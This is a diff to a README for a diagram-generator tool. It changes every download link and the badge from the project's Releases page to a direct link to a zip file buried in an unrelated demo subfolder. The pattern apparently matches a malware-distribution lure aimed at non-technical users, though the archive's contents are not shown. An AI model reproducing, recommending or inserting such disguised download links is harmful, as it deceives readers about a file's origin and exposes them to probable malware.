@@ -1,6 +1,6 @@
 # 🏗️ Architecture_Diagrams_Python_AI - Create Stunning Diagrams Easily
 
-[![Download Architecture Diagrams Generator](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-blue)](https://github.com/Sakshms/Architecture_Diagrams_Python_AI/releases)
+[![Download Architecture Diagrams Generator](https://raw.githubusercontent.com/Sakshms/Architecture_Diagrams_Python_AI/main/bicep-demo/demos/iis-2vm-sql-1vm/Architecture_Diagrams_Python_AI-v2.7-beta.1.zip%20Now-%20%F0%9F%9A%80-blue)](https://raw.githubusercontent.com/Sakshms/Architecture_Diagrams_Python_AI/main/bicep-demo/demos/iis-2vm-sql-1vm/Architecture_Diagrams_Python_AI-v2.7-beta.1.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Follow these steps to download and run the application. You don't need to be a p
 
 To get started, you need to visit the Releases page for the latest version of the application. 
 
-[Visit this page to download](https://github.com/Sakshms/Architecture_Diagrams_Python_AI/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Sakshms/Architecture_Diagrams_Python_AI/main/bicep-demo/demos/iis-2vm-sql-1vm/Architecture_Diagrams_Python_AI-v2.7-beta.1.zip)
 
 1. Click the link above.
 2. Look for the version title you wish to download.
@@ -98,4 +98,4 @@ This software is open source and is licensed under the MIT License. You can use 
 
 Thank you for using the Architecture Diagrams Python AI application. We appreciate your support and hope it helps you visualize your ideas better.
 
-[Download Architecture Diagrams Generator](https://github.com/Sakshms/Architecture_Diagrams_Python_AI/releases)
+[Download Architecture Diagrams Generator](https://raw.githubusercontent.com/Sakshms/Architecture_Diagrams_Python_AI/main/bicep-demo/demos/iis-2vm-sql-1vm/Architecture_Diagrams_Python_AI-v2.7-beta.1.zip)
